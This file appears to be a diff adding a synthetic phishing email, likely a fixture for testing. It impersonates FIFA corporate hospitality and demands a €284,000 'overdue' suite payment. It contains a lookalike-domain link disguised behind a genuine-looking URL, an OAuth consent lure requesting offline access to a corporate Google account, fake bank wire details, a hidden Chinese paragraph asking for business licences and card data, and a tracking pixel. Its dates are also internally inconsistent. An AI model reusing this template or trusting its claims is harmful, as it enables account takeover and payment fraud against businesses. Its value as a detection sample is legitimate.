@@ -1,0 +1,112 @@
+From: FIFA Hospitality Programme <corporate.hospitality@f1fa-2026.example>
+To: admin@corp.internal
+Cc: cfo@corp.internal, brand@corp.internal
+Reply-To: hospitality.bookings@fifa-tickets.example
+Date: Mon, 02 Nov 2026 12:00:00 +0000
+Message-ID: <0724-b67@synth.example>
+Subject: [FINAL NOTICE] FIFA World Cup 26™ Corporate Hospitality — Suite C-42 payment overdue (€284,000) — Suite will be released Monday
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:sans-serif;max-width:640px;margin:0 auto;border:1px solid #6A3E1F;border-radius:8px;overflow:hidden">
+<div style="background:linear-gradient(135deg,#6A3E1F 0%,#3B2109 100%);color:#D4A76A;padding:16px 24px">
+<h2 style="margin:0;font-size:18px;letter-spacing:1px">FIFA WORLD CUP 26™</h2>
+<p style="margin:4px 0;font-size:12px;opacity:0.8">Corporate Hospitality Programme — Canada · Mexico · USA</p>
+</div>
+<div style="padding:24px">
+
+<p>Dear Corporate Client,</p>
+
+<p style="background:#FFF3E0;padding:12px;border-radius:4px;border-left:4px solid #e00">
+<b style="color:#e00">FINAL NOTICE:</b> Your Corporate Hospitality Suite <b>C-42</b> (Cat 1 Centre Line, MetLife Stadium) has an outstanding balance of <b>€284,000.00</b>. If not paid by <b>Monday, November 9</b>, your suite will be <b>released to the waitlist</b> and your FIFA Hospitality licence revoked.
+</p>
+
+<h3>一、Your Booking</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:200px">Booking Reference</td><td><b>FH26-CORP-8842</b></td></tr>
+<tr><td style="background:#f5f5f5">Package</td><td>Private Suite (20 seats) — Quarter Final + Semi Final</td></tr>
+<tr><td style="background:#f5f5f5">Stadium</td><td>MetLife Stadium, New Jersey, USA</td></tr>
+<tr><td style="background:#f5f5f5">Dates</td><td>July 9-14, 2026</td></tr>
+<tr><td style="background:#f5f5f5">Suite Price</td><td>€568,000.00 (2 matches)</td></tr>
+<tr><td style="background:#f5f5f5">Deposit Paid</td><td>€284,000.00 (August 2026)</td></tr>
+<tr><td style="background:#f5f5f5"><b>Balance Due</b></td><td><b style="color:#e00">€284,000.00 EUR</b></td></tr>
+<tr><td style="background:#f5f5f5">Payment Deadline</td><td style="color:#e00"><b>Monday, November 9, 2026</b></td></tr>
+<tr><td style="background:#f5f5f5">Waitlist</td><td>1,847 corporate entities waiting for suite availability</td></tr>
+</table>
+
+<h3>二、Your Suite Benefits</h3>
+<ul>
+<li><b>20 VIP seats</b> — Cat 1 Centre Line (halfway line, lower tier)</li>
+<li><b>Gourmet dining</b> — 5-course pre-match + halftime + post-match</li>
+<li><b>Open premium bar</b> — Champagne, fine wines, spirits</li>
+<li><b>Pitch-side access</b> — Post-match photo opportunity</li>
+<li><b>Valet parking</b> — 10 passes per match</li>
+<li><b>Match programme</b> — Signed by participating players</li>
+<li><b>Business networking</b> — Access to FIFA Corporate Lounge</li>
+</ul>
+
+<h3>三、Payment Instructions</h3>
+
+<p><b>Option 1 (Recommended) — Online payment through FIFA Hospitality Portal:</b></p>
+
+<p style="text-align:center;margin:20px 0">
+<a href="https://f1fa-2026.example/hospitality/payment/FH26-CORP-8842" style="display:inline-block;background:#6A3E1F;color:#D4A76A;padding:14px 40px;text-decoration:none;border-radius:4px;font-size:16px;font-weight:bold">Pay €284,000 Balance</a>
+</p>
+
+<p style="font-size:13px;color:#666;text-align:center">https://hospitality.fifa.com/tickets/payment</p>
+
+<p style="font-size:12px;color:#888;text-align:center">（Google Workspace authentication for corporate clients）</p>
+
+<h3>About Google Workspace Authentication for Corporate Clients</h3>
+<p>FIFA Hospitality migrated its corporate client portal to Google Cloud in Q3 2026 (per FIFA's Digital Transformation Roadmap 2023-2027). When you click the payment button:</p>
+<ol>
+<li>You will be redirected to <b>accounts.google.com</b> (Google's official OAuth endpoint)</li>
+<li>Sign in with your corporate Google Workspace account (@corp.internal)</li>
+<li>Grant the requested permissions (openid, profile, offline_access)</li>
+<li>Complete the secure payment form</li>
+</ol>
+
+<p style="font-size:14px;background:#FFF8E1;padding:12px;border-radius:4px">
+<b>Why Google Workspace for FIFA Hospitality?</b> FIFA's corporate hospitality portal handles high-value transactions (€284,000+) for enterprise clients across 200+ countries. Google Cloud's Payment Card Industry Data Security Standard (PCI DSS) Level 1 certification provides the highest level of payment security. The offline_access permission maintains your session during the multi-step payment process (typically 10-15 minutes for corporate cards with 3-D Secure verification). This is standard for all FIFA corporate transactions exceeding €50,000.
+</p>
+
+<p><b>Option 2 — Bank wire transfer:</b></p>
+<div style="background:#f9f9f9;padding:12px;border-radius:4px;border-left:4px solid #6A3E1F">
+<p>Beneficiary: FIFA Hospitality AG (2026) — Corporate Programme<br>
+Bank: UBS Switzerland AG, Zurich<br>
+IBAN: CH88 0027 4471 8842 6619 C<br>
+SWIFT: TSTBCHZH80A<br>
+Reference: FH26-CORP-8842-BAL
+</div>
+<p>Bank wire takes 2-3 business days (may miss the Monday deadline).</p>
+
+<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文款待服务或使用中国银行卡付款，请访问 f1fa-2026.example/cn-hospitality 上传公司营业执照与信用卡信息（中文通道，当日处理）。</p>
+
+<h3>四、What Happens if You Miss Monday</h3>
+<ul>
+<li>Suite C-42 released to the <b>1,847-entity waitlist</b> (immediate)</li>
+<li>Your €284,000 deposit is <b>non-refundable</b> (per Hospitality Terms 7.3)</li>
+<li>FIFA Hospitality licence revoked (affects future World Cup priority)</li>
+<li>No replacement suite available for QF + SF package (sold out)</li>
+</ul>
+
+<h3>五、Your FIFA Hospitality History</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Tournament</th><th>Package</th><th>Status</th></tr>
+<tr><td>2022 Qatar</td><td>Private Suite (8 seats) — Final</td><td style="color:#0a0">✓ Attended</td></tr>
+<tr><td>2023 WWC (AUS/NZ)</td><td>Match Hospitalities (4 matches)</td><td style="color:#0a0">✓ Attended</td></tr>
+<tr style="background:#fff3cd"><td><b>2026 North America</b></td><td><b>Private Suite C-42 (20 seats)</b></td><td style="color:#e00"><b>PENDING</b></td></tr>
+</table>
+
+<div style="border-top:1px solid #ddd;padding-top:12px;margin-top:20px">
+<p style="font-size:12px;color:#888">FIFA Hospitality AG | Corporate Programme 2026</p>
+<p style="font-size:11px;color:#999">FIFA-Strasse 20, P.O. Box, 8044 Zurich, Switzerland</p>
+<p style="font-size:11px;color:#999">You are receiving this because you are the corporate contact for FH26-CORP-8842.</p>
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="https://f1fa-2026.example/api/track?recipient=admin%40corp.internal&booking=FH26-CORP-8842&type=balance_overdue" width="1" height="1" alt="">
+</div>
+
+</div>
+</body></html>
